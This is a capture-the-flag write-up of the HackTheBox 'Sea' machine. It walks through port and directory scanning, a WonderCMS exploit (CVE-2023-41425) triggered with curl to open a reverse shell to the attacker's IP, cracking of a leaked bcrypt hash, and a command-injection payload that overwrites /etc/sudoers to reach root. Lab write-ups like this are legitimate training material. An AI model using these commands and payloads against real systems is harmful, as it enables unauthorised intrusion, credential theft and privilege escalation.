

# Sea.HTB

## Reconnaissance

### Rustscan

First, I performed a scan on all open ports to identify which services are running on the target.

```bash
rustscan -a 10.129.235.245 --ulimit 9000 -- -A -O
```

![Rustscan Output](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/rustscan.png)

The scan revealed that only the SSH and HTTP ports are exposed. After adding the IP to my hosts file, I began exploring the website. I found a PHP form at the following URL:

```html
http://sea.htb/contact.php
```

### WhatWeb Scanning

Next, I used WhatWeb to gather more information about the website.

```bash
whatweb http://sea.htb
```

The WhatWeb scan indicated that the website runs on PHP and uses cookies for session management.

```bash
http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.235.245], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
```

### FFUF Directory Enumeration

I used FFUF to enumerate directories on the webserver.

```bash
ffuf -u http://sea.htb/FUZZ -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

```bash
ffuf -u http://sea.htb/themes/FUZZ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

```bash
ffuf -u http://sea.htb/themes/bike/FUZZ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

After 30 minutes of fuzzing, I discovered the following endpoints:

- `http://sea.htb/themes/bike/LICENSE`
- `http://sea.htb/themes/bike/README.md`

The `README.md` file contained the following information:

```bash
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find the theme in the list and click "Install".
4. In the "General" tab, select the theme to activate it.
```

### Finding the Exploit

A quick Google search led me to an exploit for WonderCMS: **CVE-2023-41425**.

```bash
https://github.com/prodigiousMind/CVE-2023-41425
```

#### Exploiting

To use this exploit, follow these steps:

1. Start a Netcat listener:

    ```bash
    nc -lnvp 6969
    ```

2. Run the Python exploit:

    ```bash
    python3 exploit.py http://sea.htb/themes 10.10.14.16 6969
    ```

3. Trigger the exploit using curl:

    ```bash
    curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.16&lport=6969' 
    ```

![User Exploit](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/user-exploit.png)

Boom! We have a shell on the machine!

![Shell](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/www-fail.png)

## Privilege Escalation to `amay`

Next, I ran **Linpeas** to look for potential privilege escalation vectors. I found an interesting file:

```bash
/var/www/sea/data/database.js
```

This file contained a password hash:

```js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q",
    }
}
```

### Cracking the Password Hash

I copied the hash into a file and identified it as a bcrypt hash. Then, I used **Hashcat** to crack it:

```bash
hashcat -m 3200 -a 0 hash /usr/share/seclists/rockyou.txt
```

![Hashcat](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/hashcat.png)

The password was successfully cracked:

```bash
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

### Logging in via SSH

I logged in as `amay` using SSH:

```bash
ssh amay@sea.htb
```

![User Shell](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/user.png)

### Capturing the User Flag

```bash
cat user.txt
```

## Privilege Escalation to `root`

Running Linpeas again, I discovered a webserver running on port `8080`.

![Port 8080](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/8080.png)

### Tunneling

To access the webserver, I created an SSH tunnel:

```bash
ssh -L 6969:localhost:8080 amay@sea.htb
```

I then browsed to `http://localhost:6969` and logged in with the `amay` credentials.

![Dev Panel](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/dev-panel.png)

The webserver revealed a "System Monitor (Developing)" page where I could access log files. I found the following clue in the `access.log` file:

![Access Log](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/log.png)

### Using Burp Suite

This endpoint reads the data in the `auth.log` file and displays it on the webserver:

```bash
log_file=%2Fvar%2Flog%2Fauth.log&analyze_log=
```

![Burp Suite](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/burp.png)

I attempted to change the path to `/root/root.txt` but it failed. Then, I used a payload generated by ChatGPT to get the `root.txt` file:

```bash
log_file=/root/root.txt;cp/dev/shm/sudoers> /etc/sudoers&analyze_log
```

And there it was—the root flag!

![Root Flag](https://github.com/architmadankar/HackTheBox/blob/423c0d73d93187d4f946d6ea3eb6e849e7352adf/sea.htb/snips/burp-exploit.png)

